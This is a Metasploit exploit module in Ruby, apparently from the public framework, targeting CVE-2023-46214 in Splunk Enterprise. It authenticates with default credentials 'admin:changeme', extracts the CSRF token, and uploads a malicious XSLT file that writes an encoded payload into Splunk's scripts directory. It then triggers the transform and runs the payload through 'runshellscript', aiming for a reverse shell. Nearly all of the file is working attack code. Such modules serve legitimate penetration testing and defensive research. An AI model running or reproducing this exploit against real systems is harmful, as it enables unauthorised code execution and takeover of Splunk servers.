##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Splunk Authenticated XSLT Upload RCE',
        'Description' => %q{
          This Metasploit module exploits a Remote Code Execution (RCE) vulnerability in Splunk Enterprise.
          The affected versions include 9.0.x before 9.0.7 and 9.1.x before 9.1.2. The exploitation process leverages
          a weakness in the XSLT transformation functionality of Splunk. Successful exploitation requires valid
          credentials, typically 'admin:changeme' by default.

          The exploit involves uploading a malicious XSLT file to the target system. This file, when processed by the
          vulnerable Splunk server, leads to the execution of arbitrary code. The module then utilizes the 'runshellscript'
          capability in Splunk to execute the payload, which can be tailored to establish a reverse shell. This provides
          the attacker with remote control over the compromised Splunk instance. The module is designed to work
          seamlessly, ensuring successful exploitation under the right conditions.
        },
        'Author' => [
          'nathan', # Writeup and PoC
          'Valentin Lobstein', # Metasploit module
          'h00die', # Assistance in module development
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2023-46214'],
          ['URL', 'https://github.com/nathan31337/Splunk-RCE-poc'],
          ['URL', 'https://advisory.splunk.com/advisories/SVD-2023-1104'], # Vendor Advisory
          ['URL', 'https://blog.hrncirik.net/cve-2023-46214-analysis'], # Writeup
        ],
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_PHP, ARCH_CMD],
        'Targets' => [['Automatic', {}]],
        'DisclosureDate' => '2023-11-28',
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 8000

        },
        'Privileged' => false,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [true, 'Username for Splunk', 'admin']),
        OptString.new('PASSWORD', [true, 'Password for Splunk', 'changeme']),
        OptString.new('RANDOM_FILENAME', [false, 'Random filename with 8 characters', Rex::Text.rand_text_alpha(8)]),
      ]
    )
  end

  def exploit
    cookie_string ||= authenticate
    unless cookie_string
      fail_with(Failure::NoAccess, 'Authentication failed')
    end

    sleep(0.3)
    csrf_token, updated_cookie_string = fetch_csrf_token(cookie_string)
    unless csrf_token
      fail_with(Failure::NoAccess, 'Failed to obtain CSRF token')
    end

    sleep(0.3)
    malicious_xsl = generate_malicious_xsl
    text_value = upload_malicious_file(malicious_xsl, csrf_token, updated_cookie_string)
    unless text_value
      fail_with(Failure::Unknown, 'File upload failed')
    end

    sleep(0.3)
    jsid = get_job_search_id(csrf_token, updated_cookie_string)
    unless jsid
      fail_with(Failure::Unknown, 'Creating job failed')
    end

    sleep(0.3)
    unless trigger_xslt_transform(jsid, text_value, updated_cookie_string)
      fail_with(Failure::Unknown, 'XSLT Transform failed')
    end

    sleep(0.3)
    unless trigger_payload(jsid, csrf_token, updated_cookie_string)
      fail_with(Failure::Unknown, 'Failed to execute reverse shell')
    end
  end

  def check
    unless splunk?
      return CheckCode::Unknown('Target does not appear to be a Splunk instance')
    end

    begin
      cookie_string = authenticate
    rescue RuntimeError
      cookie_string = nil
    end

    unless cookie_string
      return CheckCode::Detected('The target is Splunk but authentication failed')
    end

    version = get_version_authenticated(cookie_string)
    return CheckCode::Detected('Unable to determine Splunk version') unless version

    if version.between?(Rex::Version.new('9.0.0'), Rex::Version.new('9.0.6')) ||
       version.between?(Rex::Version.new('9.1.0'), Rex::Version.new('9.1.1'))
      return CheckCode::Appears("Exploitable version found: #{version}")
    end

    CheckCode::Safe("Non-vulnerable version found: #{version}")
  end

  def trigger_payload(jsid, csrf_token, cookie_string)
    return nil unless jsid && csrf_token

    runshellscript_url = normalize_uri(target_uri.path, 'en-US', 'splunkd', '__raw', 'servicesNS', datastore['USERNAME'], 'search', 'search', 'jobs')
    runshellscript_data = {
      'search' => "|runshellscript \"#{datastore['RANDOM_FILENAME']}.sh\" \"\" \"\" \"\" \"\" \"\" \"\" \"\" \"#{jsid}\""
    }

    upload_headers = {
      'X-Requested-With' => 'XMLHttpRequest',
      'X-Splunk-Form-Key' => csrf_token,
      'Cookie' => cookie_string
    }

    print_status("Executing payload at #{runshellscript_url}")
    res = send_request_cgi(
      'uri' => runshellscript_url,
      'method' => 'POST',
      'vars_post' => runshellscript_data,
      'headers' => upload_headers
    )

    unless res
      print_error('Failed to execute payload: No response received')
      return nil
    end

    if res.code == 201
      print_good('Payload executed successfully')
      return true
    end

    print_error("Failed to execute payload: Server returned status code #{res.code}")
    return nil
  end

  def trigger_xslt_transform(jsid, text_value, cookie_string)
    return nil unless jsid && text_value

    exploit_endpoint = normalize_uri(target_uri.path, 'en-US', 'api', 'search', 'jobs', jsid, 'results')
    exploit_endpoint << "?xsl=/opt/splunk/var/run/splunk/dispatch/#{text_value}/#{datastore['RANDOM_FILENAME']}.xsl"

    xslt_headers = {
      'X-Splunk-Module' => 'Splunk.Module.DispatchingModule',
      'Connection' => 'close',
      'Upgrade-Insecure-Requests' => '1',
      'Accept-Language' => 'en-US,en;q=0.5',
      'Accept-Encoding' => 'gzip, deflate',
      'X-Requested-With' => 'XMLHttpRequest',
      'Cookie' => cookie_string
    }

    print_status("Triggering XSLT transformation at #{exploit_endpoint}")
    res = send_request_cgi(
      'uri' => exploit_endpoint,
      'method' => 'GET',
      'headers' => xslt_headers
    )

    unless res
      print_error('Failed to trigger XSLT transformation: No response received')
      return nil
    end

    if res.code == 200
      print_good('XSLT transformation triggered successfully')
      return true
    end

    print_error("Failed to trigger XSLT transformation: Server returned status code #{res.code}")
    return nil
  end

  def generate_malicious_xsl
    encoded_payload = Rex::Text.html_encode(payload.encoded)

    xsl_template = <<~XSL
      <?xml version="1.0" encoding="UTF-8"?>
      <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
        <xsl:template match="/">
          <exsl:document href="/opt/splunk/bin/scripts/#{datastore['RANDOM_FILENAME']}.sh" method="text">
            <xsl:text>#{encoded_payload}</xsl:text>
          </exsl:document>
        </xsl:template>
      </xsl:stylesheet>
    XSL

    xsl_template
  end

  def get_job_search_id(csrf_token, cookie_string)
    return nil unless csrf_token

    jsid_url = normalize_uri(target_uri.path, 'en-US', 'splunkd', '__raw', 'servicesNS', datastore['USERNAME'], 'search', 'search', 'jobs')

    upload_headers = {
      'X-Requested-With' => 'XMLHttpRequest',
      'X-Splunk-Form-Key' => csrf_token,
      'Cookie' => cookie_string
    }

    jsid_data = {
      'search' => '|search test|head 1'
    }

    print_status("Sending job search request to #{jsid_url}")
    res = send_request_cgi(
      'uri' => jsid_url,
      'method' => 'POST',
      'vars_post' => jsid_data,
      'headers' => upload_headers,
      'vars_get' => { 'output_mode' => 'json' }
    )

    unless res
      print_error('Failed to initiate job search: No response received')
      return nil
    end

    jsid = res.get_json_document['sid']
    return jsid if jsid
  end

  def upload_malicious_file(file_content, csrf_token, cookie_string)
    unless csrf_token
      print_error('CSRF token not found')
      return nil
    end

    post_data = Rex::MIME::Message.new
    post_data.add_part(file_content, 'application/xslt+xml', nil, "form-data; name=\"spl-file\"; filename=\"#{datastore['RANDOM_FILENAME']}.xsl\"")

    upload_headers = {
      'Accept' => 'text/javascript, text/html, application/xml, text/xml, */*',
      'X-Requested-With' => 'XMLHttpRequest',
      'X-Splunk-Form-Key' => csrf_token,
      'Cookie' => cookie_string
    }

    upload_url = normalize_uri(target_uri.path, 'en-US', 'splunkd', '__upload', 'indexing', 'preview')

    res = send_request_cgi(
      'uri' => upload_url,
      'method' => 'POST',
      'data' => post_data.to_s,
      'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
      'headers' => upload_headers,
      'vars_get' => {
        'output_mode' => 'json',
        'props.NO_BINARY_CHECK' => 1,
        'input.path' => "#{datastore['RANDOM_FILENAME']}.xsl"
      }
    )

    unless res
      print_error('Malicious file upload failed: No response received')
      return nil
    end

    if res.headers['Content-Type'].include?('application/json')
      response_data = res.get_json_document
    else
      print_error('Response is not in JSON format')
      return nil
    end

    if response_data.empty?
      print_error('Failed to parse JSON or received empty JSON')
      return nil
    end

    if response_data['messages'] && !response_data['messages'].empty?
      text_value = response_data.dig('messages', 0, 'text')
      if text_value.include?('concatenate')
        print_error('Server responded with an error: concatenate found in the response')
        return nil
      end

      print_good('Malicious file uploaded successfully')
      return text_value
    end

    print_error('Server did not return a valid "messages" field')
    return nil
  end

  def fetch_csrf_token(cookie_string)
    print_status('Extracting CSRF token from cookies')

    csrf_token_match = cookie_string.match(/splunkweb_csrf_token_8000=([^;]+)/)

    if csrf_token_match
      csrf_token = csrf_token_match[1]
      print_good("CSRF token successfully extracted: #{csrf_token}")

      en_us_url = normalize_uri(target_uri.path, 'en-US', 'app', 'launcher', 'home')
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => en_us_url,
        'cookie' => cookie_string
      })

      updated_cookie_string = cookie_string

      if res && res.code == 200
        new_cookies = res.get_cookies
        updated_cookie_string += new_cookies
      end

      return [csrf_token, updated_cookie_string]
    end

    fail_with(Failure::NotFound, 'CSRF token not found in cookies')
  end

  def get_version_authenticated(cookie_string)
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/en-US/splunkd/__raw/services/authentication/users/', datastore['USERNAME']),
      'vars_get' => {
        'output_mode' => 'json'
      },
      'headers' => {
        'Cookie' => cookie_string
      }
    })

    return nil unless res&.code == 200

    body = res.get_json_document
    Rex::Version.new(body.dig('generator', 'version'))
  end

  def splunk?
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/en-US/account/login')
    })

    return true if res&.body =~ /Splunk/

    false
  end

  def authenticate
    login_url = normalize_uri(target_uri.path, 'en-US', 'account', 'login')

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => login_url
    })

    unless res
      fail_with(Failure::Unreachable, 'No response received for authentication request')
    end

    cval_value = res.get_cookies.match(/cval=([^;]*)/)[1]

    unless cval_value
      fail_with(Failure::UnexpectedReply, 'Failed to retrieve the cval cookie for authentication')
    end

    auth_payload = {
      'username' => datastore['USERNAME'],
      'password' => datastore['PASSWORD'],
      'cval' => cval_value,
      'set_has_logged_in' => 'false'
    }

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => login_url,
      'cookie' => res.get_cookies,
      'vars_post' => auth_payload
    })

    unless res && res.code == 200
      fail_with(Failure::NoAccess, 'Failed to authenticate on the Splunk instance')
    end

    print_good('Successfully authenticated on the Splunk instance')
    res.get_cookies
  end
end
